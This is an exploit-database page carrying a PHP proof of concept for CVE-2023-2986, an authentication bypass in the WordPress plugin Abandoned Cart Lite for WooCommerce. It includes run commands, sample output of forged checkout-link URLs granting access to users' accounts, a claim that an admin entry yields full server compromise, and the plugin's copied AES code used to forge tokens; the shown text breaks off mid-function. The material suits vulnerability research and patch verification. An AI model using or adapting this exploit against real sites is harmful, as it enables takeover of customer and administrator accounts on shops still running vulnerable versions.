---
title: WordPress Abandoned Cart Lite For WooCommerce 5.14.2 Authentication Bypass Exploit exploit
url: https://sploitus.com/exploit?id=1337DAY-ID-38795&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-06-18
fetch_date: 2025-10-04T11:45:00.759250
---

# WordPress Abandoned Cart Lite For WooCommerce 5.14.2 Authentication Bypass Exploit exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# WordPress Abandoned Cart Lite For WooCommerce 5.14.2 Authentication Bypass Exploit CVE-2023-2986

2023-06-17 | CVSS 9.8

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=1337DAY-ID-38795
<?php

/*

# CVE-2023-2986

Proof of Concept for vulnerability CVE-2023-2986 in 'Abandoned Cart Lite for WooCommerce' Plugin in WordPress

## Related Details

- NVD Link : https://nvd.nist.gov/vuln/detail/CVE-2023-2986
- Plugin Source : https://github.com/TycheSoftwares/woocommerce-abandoned-cart/
- Vulnerable versions : `version <= 5.14.2`
- Patched version : `5.15.0`
- Github POC Link :`https://github.com/Ayantaker/CVE-2023-2986`

## Vulnerability Analysis

- A blog link will be added.

## Usage

```bash
sudo apt-get install php-curl
php poc.php http://target_host target_port max_cart_id_to_enumerate
```

```
[*] Enumerating cart ID : 1
[+] Authentication Bypass URL for user 'victim' : https://10.39.44.149:443/?wcal_action=checkout_link&validate=pwDHtAFjg2StEr4S2bP9YXkwVdKLqnsLjpkFGythB5ztEF8twVbXFdEP6u7kYwrc
[*] Enumerating cart ID : 2
[*] Enumerating cart ID : 3
[+] Authentication Bypass URL for user 'victim2' : https://10.39.44.149:443/?wcal_action=checkout_link&validate=aQH9pwVjg2TWqKcFmNoipUeBKbYNb5UaEYMYP8DlCz3DqykRdzP3lQgEqID6QsoD
[*] Enumerating cart ID : 4
[+] Authentication Bypass URL for user 'user' : https://10.39.44.149:443/?wcal_action=checkout_link&validate=XQOexwdjg2TzUjbZJgcYAeUE1p7YdPytSYL3Vkkjb+gISKD02Cpk+3Dx6SUnbe5d
[*] Enumerating cart ID : 5

```

> Entering the URL in browser will give you access to the respective users account. If the wordpress admin user himself has an entry, this will give access to the admin console leading to full compromise of the wordpress server.

## Disclaimer

This Proof of Concept (POC) has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Author is not responsible or liable for any misuse of the POC. Use responsibly.

*/

// Uses the encryption functions sourced from the vulnerable plugin
// https://github.com/TycheSoftwares/woocommerce-abandoned-cart/tree/v5.14.2/includes/classes

/* Copied from https://github.com/TycheSoftwares/woocommerce-abandoned-cart/blob/v5.14.2/includes/classes/class-wcal-aes.php */

/*
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*
  AES implementation in PHP                                                                     */
/*
    (c) Chris Veness 2005-2014 www.movable-type.co.uk/scripts                                   */
/*
    Right of free use is granted for all commercial or non-commercial use under CC-BY licence.  */
/*
    No warranty of any form is offered.                                                         */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

/**
 * Abandoned Cart Lite for WooCommerce
 *
 * It will handle the common action for the plugin.
 *
 * @author  Tyche Softwares
 * @package Abandoned-Cart-Lite-for-WooCommerce/Encrypt-Decrypt-Data
 */

/**
 * It will genrate the encryption and decryption for data.
 *
 * @since 2.8
 */
class Wcal_Aes {

    /**
     * AES Cipher function [�5.1]: encrypt 'input' with Rijndael algorithm
     *
     * @param input message as byte-array (16 bytes)
     * @param w     key schedule as 2D byte-array (Nr+1 x Nb bytes) -
     *              generated from the cipher key by keyExpansion()
     * @return      ciphertext as byte-array (16 bytes)
     * @since 2.8
     */
    public static function cipher( $input, $w ) {
        $Nb    = 4; // block size (in words): no of columns in state (fixed at 4 for AES)
        $Nr    = count( $w ) / $Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit keys
        $state = array(); // initialise 4xNb byte-array 'state' with input [�3.4]
        for ( $i = 0; $i < 4 * $Nb;
        $i++ ) {
            $state[ $i % 4 ][ floor( $i / 4 ) ] = $input[ $i ];
        }

        $state = self::addRoundKey( $state, $w, 0, $Nb );

        for ( $round = 1; $round < $Nr; $round++ ) { // apply Nr rounds
            $state = self::subBytes( $state, $Nb );
            $state = self::shiftRows( $state, $Nb );
            $state = self::mixColumns( $state, $Nb );
            $state = self::addRoundKey( $state, $w, $round, $Nb );
        }

        $state = self::subBytes( $state, $Nb );
        $state = self::shiftRows( $state, $Nb );
        $state = self::addRoundKey( $state, $w, $Nr, $Nb );

        $output = array( 4 * $Nb ); // convert state to 1-d array before returning [�3.4]
        for ( $i = 0; $i < 4 * $Nb;
        $i++ ) {
            $output[ $i ] = $state[ $i % 4 ][ floor( $i / 4 ) ];
        }
        return $output;
    }
    /**
     * Xor Round Key into state S [�5.1.4].
     *
     * @since 2.8
     */
    private static function addRoundKey( $state, $w, $rnd, $Nb ) {
        for ( $r = 0; $r < 4; $r++ ) {
            for ( $c = 0; $c < $Nb;
            $c++ ) {
                $state[ $r ][ $c ] ^= $w[ $rnd * 4 + $c ][ $r ];
            }
        }
        return $state;
    }

    /**
     * Apply SBox to state S [�5.1.1].
     *
     * @since 2.8
     */
    private static function subBytes( $s, $Nb ) {
        for ( $r = 0; $r < 4; $r++ ) {
            for ( $c = 0; $c < $Nb;
            $c++ ) {
                $s[ $r ][ $c ] = self::$sBox[ $s[ $r ][ $c ] ];
            }
        }
        return $s;
    }

    /**
     * Shift row r of state S left by r bytes [�5.1.2].
     *
     * @since 2.8
     */
    private static function shiftRows( $s, $Nb ) {
        $t = array( 4 );
        for ( $r = 1; $r < 4; $r++ ) {
            for ( $c = 0; $c < 4;
            $c++ ) {
                $t[ $c ] = $s[ $r ][ ( $c + $r ) % $Nb ]; // shift into temp copy
            }
            for ( $c = 0; $c < 4;
            $c++ ) {
                $s[ $r ][ $c ] = $t[ $c ]; // and copy back
            }
        } // note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):
        return $s; // see fp.gladman.plus.com/cryptography_technology/rijndael/aes.spec.311.pdf
    }

    /**
     * Combine bytes of each col of state S [�5.1.3].
     *
     * @since 2.8
     */
    private static function mixColumns( $s, $Nb ) {
        for ( $c = 0; $c < 4; $c++ ) {
            $a = array( 4 ); // 'a' is a copy of the current column from 's'
            $b = array( 4 ); // 'b' is a�{02} in GF(2^8)
            for ( $i = 0; $i < 4; $i++ ) {
                $a[ $i ] = $s[ $i ][ $c ];
                $b[ $i ] = $s[ $i ][ $c ] & 0x80 ? $s[ $i ][ $c ] << 1 ^ 0x011b : $s[ $i ][ $c ] << 1;
            }
            // a[n] ^ b[n] is a�{03} in GF(2^8)
            $s[0][ $c ] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; // 2*a0 + 3*a1 + a2 + a3
            $s[1][ $c ] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; // a0 * 2*a1 + 3*a2 + a3
            $s[2][ $c ] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3]; // a0 + a1 + 2*a2 + 3*a3
            $s[3][ $c ] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3]; // 3*a0 + a1 + a2 + 2*a3
        }
        return $s;
    }

    /**
     * Generate Key Schedule from Cipher Key [�5.2].
     *
     * Perform key expansion on cipher key to generate a key schedule.
     *
     * @param  key cipher key byte-array (16 bytes).
     * @return key schedule as 2D byte-array (Nr+1 x Nb bytes).
     * @since 2.8
     */
    public static function keyExpansion( $key ) {
        $Nb = 4; // block size (in words): no of columns in state (fixed at 4 for AES)
        $Nk = count( $key ) / 4; // key length (in words): 4/6/8 for 128/192/256-bit keys
        $Nr = $Nk + 6; // no of rounds: 10/12/14 for 128/192/256-bit keys

        $w    = array();
        $temp = array();

        for ( $i = 0; $i < $Nk; $i++ ) {
            $r       = array( $key[ 4 * $i ], $key[ 4 * $i + 1 ]...